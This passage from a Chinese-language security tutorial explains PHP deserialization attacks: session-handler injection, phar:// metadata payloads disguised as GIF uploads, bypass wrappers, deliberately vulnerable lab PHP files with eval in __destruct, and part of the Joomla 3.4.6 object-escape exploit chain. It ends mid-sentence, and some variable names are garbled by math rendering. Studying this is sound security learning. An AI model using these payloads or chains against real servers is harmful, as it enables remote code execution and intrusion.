<p>可以看到 PHP 能自动反序列化数据的前提是，现有的会话数据是以特殊的序列化格式存储。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//那么上一个例子的payload是：</span><br><span class="line">&lt;?php</span><br><span class="line">    class user&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        var $age;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = new user();</span><br><span class="line">    $a-&gt;name = &quot;bmjoker&quot;;</span><br><span class="line">    $a-&gt;age = &quot;888&quot;;</span><br><span class="line">    echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;bmjoker&quot;;s:3:&quot;age&quot;;s:3:&quot;888&quot;;&#125;</span><br><span class="line">我们只需要在前面加个|</span><br><span class="line">|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;bmjoker&quot;;s:3:&quot;age&quot;;s:3:&quot;888&quot;;&#125;</span><br><span class="line">此时session中的username的值为</span><br><span class="line">|O:4:&quot;user&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;bmjoker&quot;;s:3:&quot;age&quot;;s:3:&quot;888&quot;;&#125;</span><br><span class="line">使用php引擎读取时</span><br><span class="line">|后面的全部会变成value值</span><br><span class="line">就可以出发__wakeup魔法方法</span><br></pre></td></tr></table></figure>
<p>但这种方法是在可以对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>S</mi><mi>S</mi><mi>I</mi><mi>O</mi><mi>N</mi><mtext>进行赋值的情况下实现的，那如果代码中不存在对</mtext></mrow><annotation encoding="application/x-tex">_SESSION进行赋值的情况下实现的，那如果代码中不存在对</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">赋</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">情</span><span class="mord cjk_fallback">况</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">码</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">对</span></span></span></span>_SESSION 变量赋值的情况下又该如何利用？</p>
<p>在 PHP 中还存在一个 upload_process 机制，即自动在 $_SESSION 中创建一个键值对（key:value），value 中刚好存在用户可控的部分，可以看下官方描述的，这个功能在文件上传的过程中利用 session 实时返回上传的进度。</p>
<h4 id="phar伪协议触发php反序列化"><a class="markdownIt-Anchor" href="#phar伪协议触发php反序列化">#</a> phar 伪协议触发 php 反序列化</h4>
<p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入 unserialize ()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的 Black Hat 上提出利用 phar 文件会以序列化的形式存储用户自定义的 meta-data 这一特性，拓展了 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。</p>
<p><strong>phar 介绍和漏洞原理</strong></p>
<p>phar 就是 php 压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与 file://，php:// 等类似，也是一种流包装器。</p>
<p><strong>phar 文件有四部分构成</strong>：</p>
<p><strong>1. a stub</strong></p>
<p>识别 phar 拓展的标识，格式为：xxx<?php xxx; __HALT_COMPILER();?>，对应的函数 Phar::setStub。前期内容不限，但必须以 __HALT_COMPILER ();?&gt; 结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。</p>
<p><strong>2. a manifest describing the contents</strong></p>
<p>phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 meta-data，这是漏洞利用的核心部分。对应函数 Phar::setMetadata— 设置 phar 归档元数据。</p>
<p><strong>3. the file contents</strong></p>
<p>被压缩文件的内容。</p>
<p><strong>4. [optional] a signature for verifying Phar integrity (phar file format only)</strong></p>
<p>签名，放在文件末尾。对应函数 Phar :: stopBuffering— 停止缓冲对 Phar 存档的写入请求，并将更改保存到磁盘。</p>
<p><strong>这里有两个关键点：</strong></p>
<ol>
<li>
<p><strong>文件标识</strong>，必须以 __HALT_COMPILER ();?&gt; 结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者 pdf 文件来绕过一些上传限制</p>
</li>
<li>
<p><strong>反序列化</strong>，phar 存储的 meta-data 信息以序列化方式存储，当文件操作函数通过 phar:// 伪协议解析 phar 文件时，文件内容会被解析成 phar 对象，然后 phar 对象内的 meta-data 会被反序列化。</p>
</li>
</ol>
<p>meta-data 是用 serialize () 生成并保存在 phar 文件中，当内核调用 phar_parse_metadata () 解析 meta-data 数据时，会调用 php_var_unserialize () 对其进行反序列化操作，因此会造成反序列化漏洞。</p>
<p>而在一些上传点，我们可以更改 phar 的文件头并且修改其后缀名绕过检测，如：test.gif，里面的 meta-data 却是我们提前写入的恶意代码，而且可利用的文件操作函数又很多，所以这是一种不错的绕过 + 执行的方法。</p>
<p>生成 phar 文件的代码如下：</p>
<p>phar.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //反序列化payload构造</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line"></span><br><span class="line">    //实例一个phar对象供后续操作，后缀名必须为phar</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); </span><br><span class="line">    //开始缓冲对phar的写操作 </span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    </span><br><span class="line">    //设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); </span><br><span class="line"></span><br><span class="line">    //将反序列化的对象放入该文件中</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $o-&gt;data=&#x27;i am bmjoker&#x27;;</span><br><span class="line">    //将自定义的归档元数据meta-data存入manifest</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line"></span><br><span class="line">    //phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;bmjoker&quot;); </span><br><span class="line">    //停止缓冲对phar的写操作</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以明显的看到 meta-data 是以序列化的形式存储的，有序列化数据必然会有反序列化操作，php 一大部分的文件系统函数在通过 phar:// 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，测试后受影响的函数如下：</p>
<table>
<thead>
<tr>
<th><em><strong>* 受影响的文件操作函数列表 *</strong></em></th>
<th>** **</th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
<td>touch</td>
<td>get_meta_tags</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
<td>hash_file</td>
<td>get_headers</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
<td>md5_file</td>
<td>getimagesize</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
<td>sha1_file</td>
<td>getimagesizefromstring</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
<td>hash_update_file</td>
<td>imageloadfont</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
<td>hash_hmac_file</td>
<td>exif_imagetype</td>
</tr>
</tbody>
</table>
<p>这些函数里面可以使用 phar 协议，当然还有常用的文件包含的几个函数 include、include_once、requrie、require_once</p>
<p>对刚才生成的 phar 使用文件操作函数实现反序列化读取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject&#123;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">            echo $this-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename =  &quot;phar://phar.phar/test.txt&quot;;</span><br><span class="line">    file_get_contents($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="0x10"><a class="markdownIt-Anchor" href="#0x10">#</a> 0x10</h4>
<p>upload_file.php：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123;</span><br><span class="line">    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line">    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;</span><br><span class="line">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">        echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;Invalid file,you can only upload gif&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>upload_file.html</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://127.0.0.1/upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>file_un.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);   // 漏洞点</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>upload_file.php 对上传文件的类型，后缀进行了判断，限制为 GIF 文件。而 file_un.php 文件主要使用 file_exists () 判断文件是否存在，并且存在魔术方法__destruct ()。大概思路为首先根据 file_un.php 写一个生成 phar 的 php 文件，当然需要绕过为 gif 的限制，所以需要加 GIF89a，然后我们访问这个 php 文件后，生成了 phar.phar，修改后缀为 gif，上传到服务器，然后利用 file_exists，使用 phar:// 执行代码。</p>
<p>构造 payload 代码 eval.php：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var $output = &#x27;echo &quot;ok&quot;;&#x27;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">$object = new AnyClass();</span><br><span class="line">$object -&gt; output= &#x27;phpinfo();&#x27;;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>访问 eval.php，会在当前目录生成 phar.phar，然后修改后缀 gif</p>
<p><strong>漏洞利用条件</strong></p>
<p>\1. phar 文件要能够上传到服务器端（如 GET、POST），并且要有 file_exists ()，fopen ()，file_get_contents ()，include () 等文件操作的函数</p>
<p>\2. 要有可用的魔术方法作为 &quot;跳板&quot;；</p>
<p>\3. 文件操作函数的参数可控，且：，/，phar 等特殊字符没有被过滤。</p>
<p>虽然某些函数能够支持 phar:// 的协议，但是如果目标服务器没有关闭 phar.readonly 时，就不能正常执行反序列化操作。</p>
<p><strong>在禁止 phar 开头的情况下的替代方法:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://phar://phar.phar/test.txt</span><br><span class="line"></span><br><span class="line">compress.bzip2://phar://phar.phar/test.txt </span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt</span><br></pre></td></tr></table></figure>
<p>虽然会报 warning，但是还是会执行。</p>
<h3 id="joomla-346对象逃逸反序列化执行"><a class="markdownIt-Anchor" href="#joomla-346对象逃逸反序列化执行">#</a> Joomla  3.4.6 对象逃逸反序列化执行</h3>
<p>Joomla 反序列化漏洞的主要原因是：</p>
<blockquote>
<p>Joomla 不论账号密码是否正确，都会把登录的用户名和密码，通过序列化的方式存储在 session 表中，再以反序列化的方式读取 session 表中的内容。由于 protected 修饰的变量在序列化的时候，会变成 \x00 + * + \x00 + [变量名] 的形式，而 mysql 无法保存 NULL 字节的数据，所以在向 session 表写入的过程中会将 \x00*\x00 替换为 \0\0\0 ，同样在读取 session 表中的内容的时候会再次转换，然后进行反序列化。如果在向 session 表存储的过程中构造恶意构造一些 \0\0\0，那么在进行反序列化的时候就会由于字节数对不上，导致 “溢出” ，使得反序列化对象逃逸出来。</p>
</blockquote>
<p>如果上面这段没看懂，可以看上面利用章节的对象逃逸，如果还看不懂就退学吧</p>
<p>尝试使用错误的账号密码登录，查看一下 session 表中的内容：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028001846145-1227489260.png" alt="img"></p>
<p>在登录过程中，会有一个 303 的跳转，这个跳转是先把用户的输入经过序列化存储在 session 表中，读取的时候再从 session 表中取出数据进行反序列化，进行账号密码对比</p>
<p>通过序列化写入 session 表的具体代码如下：</p>
<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; write()</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028225321914-653179029.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225321914-653179029.png" alt="img"></a></p>
<p>因为 protected 修饰的变量在序列化后会变成这种形式：\x00 + * + \x00 + [变量名]，而 mysql 无法保存 NULL 字节的数据，所以在代码中可以看到在写入 session 表的过程中会将 \x00*\x00 替换为 \0\0\0 来进行存储，就比如 Registry 类下 protected 修饰的 $data 变量，序列化存储为：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028231208408-1317263109.png"><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028231208408-1317263109.png" alt="img"></a></p>
<p>通过反序列化读取 session 表的具体代码如下：</p>
<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; read()</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225519116-1363963610.png" alt="img"></p>
<p>在读取时会重新把 \0\0\0 替换为 \x00*\x00 来进行反序列化。</p>
<p>因此反序列化存入 session 表中的数据比原始数据要多 3 个字节</p>
<p>如果传入的用户名为 \0\0\0admin，序列化写入 session 表中的数据为：</p>
<p>在调用 read 方法进行读取时会先将 \0\0\0 转换为 N*N（\x00 为空字节为方便展示这里使用 N 代替）：</p>
<p>\0\0\0admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:&quot;username&quot;;s:11:&quot;N*Nadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;</span><br></pre></td></tr></table></figure>
<p>因为 read 之后长度变短了 3 个字节，在反序列化的时候 username 的值为 s:11:“N<em>Nadmin&quot;，但是实际只有 8 个字节，为了满足反序列化的规则，就会吃掉后面 3 个字节的数据，直至凑齐 11 个字符，也就是 s:11:&quot;N</em>Nadmin”;s。</p>
<p>利用这个思路，足够多的 \0\0\0 就可以将 password 字段的数据逃逸出来，构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:54:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</span><br></pre></td></tr></table></figure>
<p>read () 之后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345</span><br></pre></td></tr></table></figure>
<p>username 的值为 N<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN*N&quot;;s:8:“password”;s:6:&quot;12345，后面补上 &quot; 和；就成功逃逸出来了</p>
<p>实现对象注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345&quot;;s:2:&quot;HS&quot;:O:15:&quot;ObjectInjection&quot;</span><br></pre></td></tr></table></figure>
<p>这里来分析一下利用链，通过搜索 eval/assert/call_user_func… 这类可以利用并且参数可控的危险函数，可以找到用于构造执行链的类：</p>
<p>这几个文件调取 call_user_func 的方式都相同，来看一下 libraries\joomla\database\driver\mysqli.php 中方法的具体实现</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221114210130490.png" alt="image-20221114210130490"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031162618304-261047353.png" alt="img"></p>
<p>当 JDatabaseDriverMysqli 这个类的对象被调用，在结束时都会调用析构函数__destruct，__destruct 中会调用 disconnect () 方法。</p>
<p>而当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>c</mi><mi>o</mi><mi>n</mi><mi>n</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>为</mtext><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>的时候，就会调用</mtext><mi>c</mi><mi>a</mi><mi>l</mi><msub><mi>l</mi><mi>u</mi></msub><mi>s</mi><mi>e</mi><msub><mi>r</mi><mi>f</mi></msub><mi>u</mi><mi>n</mi><msub><mi>c</mi><mi>a</mi></msub><mi>r</mi><mi>r</mi><mi>a</mi><mi>y</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">this-&gt;connection为true的时候，就会调用call_user_func_array(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">u</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mopen">(</span></span></span></span>h, array(&amp;this)); 方法对disconnectHandlers数组中的每个值，都会执行call_user_func_array()，并将&this 作为参数引用，但是不能控制参数，所以不能直接构造 assert+eval 来执行任意代码。</p>
<p>继续往下看发现在 libraries\simplepie\simplepie.php 中有一处 call_user_func 方法调用</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031171046685-27582232.png" alt="img"></p>
<p>这个 call_user_func ($this-&gt;cache_name_function, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>f</mi><mi>e</mi><mi>e</mi><msub><mi>d</mi><mi>u</mi></msub><mi>r</mi><mi>l</mi><mo stretchy="false">)</mo><mtext>两个参数都是可控的，于是只要满足</mtext></mrow><annotation encoding="application/x-tex">this-&gt;feed_url)两个参数都是可控的，于是只要满足</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">u</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mord 